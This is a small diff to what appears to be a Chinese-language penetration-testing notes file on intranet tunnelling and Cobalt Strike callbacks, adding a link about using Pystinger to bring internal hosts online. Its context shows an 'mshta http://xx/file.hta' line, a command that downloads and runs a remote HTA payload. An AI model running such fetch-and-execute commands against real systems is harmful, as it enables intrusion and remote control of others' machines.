@@ -77,6 +77,7 @@ mshta http://xx/file.hta
 5. pystinger
 
 [bind_tcp | 内网隧道的多种应用方式 | cobalt strke正向连接多层内网, 反向](https://mp.weixin.qq.com/s/iZxmQJQrLs7XP7XlhGfHmA)
+[Pystinger实现内网主机CS上线](https://blog.csdn.net/qq_38963246/article/details/115300897)
 
 0.bind方式上线
 ```
